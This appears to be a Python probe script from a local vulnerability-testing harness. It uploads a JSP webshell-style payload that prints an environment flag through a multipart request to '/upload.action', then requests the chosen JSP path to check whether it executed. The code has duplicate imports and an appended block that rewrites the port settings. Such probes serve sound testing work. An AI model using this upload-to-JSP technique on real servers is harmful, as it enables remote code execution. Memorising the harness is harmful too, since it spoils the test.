#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {'v0': 'http://127.0.0.1:1', 'v1': 'http://127.0.0.1:2'}
import argparse
import json
import os
import secrets
import subprocess
import sys
import time
import urllib.request
import urllib.error
from pathlib import Path
JSP_PAYLOAD = 'PCB[<%= System.getenv("PCB_FLAG") %>]PCB\n'
PORTS = {"v0": 18630, "v1": 18632}
def new_flag():
    return os.environ.get("PCB_FLAG") or "PCBFLAG_UNSET"
X = os.environ.get("PCB_X") or new_flag()
def run_probe(candidate, *, version="v1"):
    
    if not isinstance(candidate, dict):
        candidate = {"id": "raw", "file_field": "upload", "file_filename": "data.txt",
                     "text_fields": [["uploadFileName", str(candidate)]], "target_jsp": "/x.jsp"}
    base = base_url(version)
    boundary, body = _multipart(candidate)
    up_code, up_body = _http("POST", base + "/upload.action", body=body,
                             ctype="multipart/form-data; boundary=" + boundary)
    get_code, get_body = _http("GET", base + candidate["target_jsp"])
    flag_hit = X if (X and X in get_body) else ""
    return {
        "version": version,
        "id": candidate.get("id"),
        "upload_code": up_code,
        "upload_body": (up_body or "")[:300],
        "target": candidate["target_jsp"],
        "get_code": get_code,
        "X": flag_hit,
        "get_body": (get_body or "")[:300],
    }
def base_url(version):
    return "http://127.0.0.1:%d" % PORTS[version]
def _multipart(candidate):
    
    boundary = "----pcb" + secrets.token_hex(8)
    crlf = "\r\n"
    parts = []
    fld = candidate["file_field"]
    fn = candidate["file_filename"]
    parts.append("--" + boundary)
    parts.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (fld, fn))
    parts.append("Content-Type: application/octet-stream")
    parts.append("")
    parts.append(JSP_PAYLOAD.rstrip("\n"))
    for name, value in candidate.get("text_fields", []):
        parts.append("--" + boundary)
        parts.append('Content-Disposition: form-data; name="%s"' % name)
        parts.append("")
        parts.append(value)
    parts.append("--" + boundary + "--")
    parts.append("")
    body = crlf.join(parts).encode("utf-8")
    return boundary, body
def _http(method, url, *, body=None, ctype=None, timeout=20):
    req = urllib.request.Request(url, data=body, method=method)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return None, "ERR:" + repr(e)


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))